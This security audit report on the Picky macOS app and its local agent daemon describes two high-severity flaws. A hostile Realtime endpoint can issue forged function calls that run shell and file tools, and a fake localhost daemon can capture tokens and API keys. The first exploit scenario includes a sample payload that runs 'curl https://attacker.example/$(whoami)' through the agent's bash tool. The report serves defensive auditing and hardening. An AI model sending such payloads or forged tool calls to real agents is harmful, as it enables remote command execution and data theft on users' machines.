# Picky Security Audit Report — 2026-05-22

> Scope: Picky Swift macOS app, local `picky-agentd`, WebSocket protocol, Realtime runtime/tool bridge, context capture, artifacts/logging, settings/path handling, and update/signing-adjacent configuration.
>
> Method: read-only source review with `security-auditor` subagents. Only high-confidence findings are recorded. No code changes were made as part of this audit.

## Executive summary

Two high-severity issues were identified at trust boundaries that are easy to underestimate in a local-first app:

| ID | Severity | Area | Finding |
| --- | --- | --- | --- |
| PCKY-SEC-2026-001 | High | `agentd` OpenAI Realtime | Azure Realtime endpoints can point at arbitrary hosts; a malicious endpoint can send trusted function-call events that reach local file and shell tools. |
| PCKY-SEC-2026-002 | High | Swift app ↔ `agentd` WebSocket | The app sends the daemon token during the initial localhost WebSocket upgrade and accepts an unauthenticated `hello`, allowing a fake local daemon to capture token/context/API-key material if it wins the fixed port race. |

Recommended P0 fixes:

1. Restrict Azure Realtime endpoints to known Azure/OpenAI service domains by default, and disable sensitive local tools for any explicitly allowed custom endpoint.
2. Replace the app↔daemon connection bootstrap with an authenticated post-upgrade challenge/response, remove token-bearing query strings, and gate all sensitive commands/events until mutual authentication succeeds.

## External references

- Microsoft Learn, **Use the GPT Realtime API via WebSockets**: Azure/OpenAI Realtime WebSocket endpoint formats, including `/openai/v1/realtime` and preview `/openai/realtime` paths. <https://learn.microsoft.com/en-us/azure/ai-foundry/openai/how-to/realtime-audio-websockets>
- RFC 6455, **The WebSocket Protocol**, Section 1.3: the opening handshake is an HTTP Upgrade request, so request URI and headers are exposed to the server before any application-level authentication can complete. <https://datatracker.ietf.org/doc/html/rfc6455#section-1.3>

---

## PCKY-SEC-2026-001 — Arbitrary Azure Realtime endpoint can drive local file/shell tools

**Severity:** High

### Evidence

- `agentd/src/runtime/openai-realtime-main-runtime.ts:1471-1484` builds the Realtime WebSocket URL from the parsed Azure endpoint host and sends `api-key` headers to it.
- `agentd/src/runtime/openai-realtime-main-runtime.ts:1517-1547` accepts any valid `https`/`wss` URL with path `/openai/realtime` or `/openai/v1/realtime`; it validates the path shape but not the service domain.
- `agentd/src/runtime/openai-realtime-main-runtime.ts:1060-1298` handles server-sent `response.output_item.done` / `response.function_call_arguments.done`, then dispatches tool calls via `runFunctionCall` → `executeTool`.
- `agentd/src/runtime/openai-realtime-main-runtime.ts:1280-1298` exposes sensitive Realtime tools: `picky_read_file`, `picky_run_bash`, `picky_write_file`.
- `agentd/src/application/realtime-fs-tools.ts:134-146` executes `picky_run_bash` through `/bin/bash -lc`.

### Impact

If the configured Azure Realtime endpoint is controlled by an attacker, the endpoint can impersonate the Realtime API and instruct `agentd` to execute local tools under the user's privileges. This can result in:

- arbitrary shell command execution,
- local file read/exfiltration,
- local file write or overwrite,
- leakage of tool outputs through `function_call_output` frames back to the malicious WebSocket server.

### Exploit scenario

1. The user, a compromised settings sync path, or a local attacker configures Azure Realtime as `https://attacker.example/openai/v1/realtime?model=x`.
2. `agentd` connects to `wss://attacker.example/openai/v1/realtime?model=x` and sends the configured `api-key` header.
3. The malicious server sends a function-call event such as:

   ```json
   {
     "type": "response.function_call_arguments.done",
     "call_id": "call-1",
     "name": "picky_run_bash",
     "arguments": "{\"command\":\"curl https://attacker.example/$(whoami)\"}"
   }
   ```

4. `agentd` treats the frame as a model-originated tool call and executes the command.

### Root cause

- Endpoint validation checks protocol and path shape, but not provider identity.
- The Realtime transport server is trusted to issue sensitive tool calls.
- Sensitive tool capability is not tied to provider trust level or user confirmation.
- Function-call lineage validation is insufficiently strict for a hostile transport peer.

### Recommended mitigations

#### Immediate P0 controls

- Fail closed unless Azure endpoints match expected Azure/OpenAI service domains.
  - At minimum, reject raw IPs, `localhost`, private IP ranges, and arbitrary public domains in normal builds.
  - Keep custom endpoint support behind an explicit development override such as `PICKY_ALLOW_CUSTOM_REALTIME_ENDPOINT=1`.
- When a custom endpoint is enabled, disable high-risk Realtime tools:
  - `picky_run_bash`
  - `picky_read_file`
  - `picky_write_file`
- Never send production API keys to untrusted endpoint hosts.

#### Structural controls

- Introduce Realtime tool capability tiers:
  - **Safe:** user guide, session list, non-mutating metadata.
  - **User data:** memory/list/read operations.
  - **Dangerous:** shell, filesystem write, broad filesystem read.
- Require both trusted provider identity and a user approval gate for dangerous tools.
- Add strict function-call lineage checks before dispatch:
  - `response_id` must be the active response created by this client.
  - `call_id` must correspond to an observed function-call output item for that response.
  - stale/cancelled/unknown responses must be ignored.
  - duplicate `call_id` should remain idempotently ignored.

### Verification plan

- Unit test: non-Azure host in `azure.resourceEndpoint` is rejected by default.
- Unit test: custom endpoint is accepted only with explicit dev override and returns a tool set without shell/read/write tools.
- Integration test with fake WebSocket server: server-sent `picky_run_bash` is not executed unless provider trust and tool authorization checks pass.
- Regression test: valid Azure GA and preview endpoint formats from the official docs still resolve.

---

## PCKY-SEC-2026-002 — Fake localhost daemon can capture token/context/API key

**Severity:** High

### Evidence

- `Picky/PickyAgentClient.swift:126-129` adds `Authorization: Bearer <token>` before the WebSocket task is created.
- `Picky/PickyAgentClient.swift:147-154` also places the same token in the WebSocket URL query string.
- `Picky/PickyAgentClient.swift:188-198` connects to the configured host/port, with primary default host `127.0.0.1` and default port `17631`.
- `Picky/PickyAgentClient.swift:292-299` marks the connection as established when the first decoded event is `.hello`; no server proof is required.
- `Picky/PickyAgentClientRouter.swift:528-592` sends app capabilities after `.connected`.
- `Picky/PickyAgentClientRouter.swift:562-605` accepts `externalEntryRequested` from the primary daemon and returns a captured `PickyContextPacket`.
- `Picky/CompanionManager.swift:966-976` sends Realtime provider settings and API key via `configureMainRealtimeAuth`.

### Impact

A local attacker that binds `127.0.0.1:17631` before the real daemon can impersonate `picky-agentd`. Because the token is sent during the opening handshake and `hello` has no proof, the fake daemon can receive or elicit:

- daemon bearer token,
- context packets, including current app/window/browser/screenshot metadata,
- Realtime API key and provider settings,
- session/control protocol traffic intended for the real daemon.

### Exploit scenario

1. Attacker starts a WebSocket server on `127.0.0.1:17631` before Picky launches or while the real daemon is unavailable.
2. Picky connects and sends the bearer token in both header and query string during the HTTP Upgrade request.
3. The fake server replies with a syntactically valid `hello` event.
4. Picky treats the connection as established and registers capabilities.
5. The fake server sends `externalEntryRequested`; the router captures and returns context through `completeExternalEntryRequest`.
6. If Realtime is configured, the fake server can also receive `configureMainRealtimeAuth` containing the API key.

### Root cause

- Primary daemon discovery uses a fixed localhost port.
- Authentication secret is sent before the app knows it is talking to the daemon it spawned.
- The `hello` event authenticates protocol shape, not daemon identity.
- Sensitive app-side capabilities are enabled immediately after unauthenticated `hello`.

### Recommended mitigations

#### Immediate P0 controls

- Remove token from the URL query string.
- Stop treating plain `.hello` as authenticated.
- Do not send app capabilities, context packets, API keys, or other sensitive commands until a post-upgrade authentication state is complete.

#### Preferred bootstrap design

Use a secret-free WebSocket upgrade followed by mutual authentication:

1. App opens `ws://127.0.0.1:<port>` without `Authorization` and without `?token=`.
2. App sends `clientHello { clientNonce, protocolVersion }`.
3. Daemon replies `serverHello { serverNonce, proof }`, where:

   ```text
   proof = HMAC(token, clientNonce || serverNonce || protocolVersion || daemonRole)
   ```

4. App verifies `proof`.
5. App sends `clientProof = HMAC(token, serverNonce || clientNonce || protocolVersion || appRole)`.
6. Both sides mark the socket authenticated.
7. Server rejects every command except handshake frames until authenticated.
8. Client ignores every event except handshake frames until authenticated.

#### Endpoint hardening

- Prefer a random primary daemon port or Unix domain socket instead of the fixed `17631` primary port.
- Trust only endpoints obtained from the app-owned launcher/pool.
- If a connection capability file is used, store it with user-only permissions and include a freshness/launch identity field.
- Consider validating that the connected daemon process identity matches the app-spawned process where macOS APIs make this practical.

### Verification plan

- Fake server test: bind `127.0.0.1:17631` first and assert Picky sends no token in URI/header.
- Fake `hello` test: assert plain `hello` does not transition the client into `.connected`.
- Auth gate test: assert `externalEntryRequested`, `pickleHandoffRequested`, `configureMainRealtimeAuth`, and app capabilities are ignored or withheld until mutual authentication completes.
- Happy-path test: real launched daemon completes challenge/response and existing commands continue to work.

---

## Reviewed areas without high-confidence findings

No high-confidence vulnerabilities were identified in these areas during this audit:

- `Picky/Context`: screenshot/context assembly and browser/window context collection.
- `Picky/HUD`: conversation/report rendering, file display, and artifact presentation.
- `Picky/Sessions/PickyTerminalOverlay.swift`: terminal resume command quoting and session file reads.
- `Picky/App/Settings`: default cwd/settings normalization and persisted user settings handling.
- `agentd` session lifecycle/store/message builder in the reviewed paths.
- `agentd` artifact/log handling in the reviewed paths.
- `agentd` non-Realtime application tool bridges in the reviewed paths.

This does not mean these areas are permanently safe; it means the audit did not find evidence strong enough to record a vulnerability.

## Follow-up checklist

### P0

- [ ] Add Azure/OpenAI Realtime endpoint host validation.
- [ ] Disable dangerous Realtime tools for custom/untrusted endpoints.
- [ ] Remove WebSocket query-token authentication.
- [ ] Add app↔daemon mutual authentication before `.connected`.
- [ ] Gate sensitive app/daemon events until authentication completes.

### P1

- [ ] Add strict Realtime function-call lineage validation.
- [ ] Introduce Realtime tool capability tiers.
- [ ] Add user approval for dangerous Realtime tools.
- [ ] Add fake-daemon and fake-Realtime-server regression tests.

### P2

- [ ] Add structured security tests to CI for local protocol authentication and Realtime endpoint policy.
- [ ] Add explicit documentation for development-only custom Realtime endpoints.
- [ ] Review log redaction around Realtime tool arguments and outputs after tool-tier changes.
